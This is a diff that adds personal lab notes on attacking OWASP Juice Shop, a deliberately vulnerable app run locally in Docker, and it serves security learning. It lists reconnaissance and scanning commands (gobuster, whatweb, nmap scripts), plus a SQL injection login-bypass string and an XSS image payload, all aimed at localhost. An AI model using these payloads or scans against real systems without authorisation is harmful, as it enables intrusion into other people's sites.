@@ -1,0 +1,22 @@
+Juice shop
+1.Docker pull -   sudo docker pull bkimminich/juice-shop
+2.Docker run - docker run --rm -p 3000:3000 bkimminich/juice-shop
+
+Information Gathering (Reconnaissance) on Juice Shop
+
+1.	Banner Grabbing -  curl -I http://localhost:3000
+2.	Directory and File Enumeration - gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt
+3.	Identify Technologies Used - whatweb http://localhost:3000
+
+Vulnerability Scan (using Nmap scripts):
+1.	nmap -sV -p 3000 --script http-enum,http-methods,http-title localhost
+Sensitive Information in URLs or JavaScript Files
+-curl http://localhost:3000/assets/public/ftp
+-curl http://localhost:3000/main.js
+
+SQL injection
+Login -> Email: ' OR 1=1--
+                  Password: anything
+XSS
+In the Search bar, type:
+     <img src=x onerror=alert('XSS')>
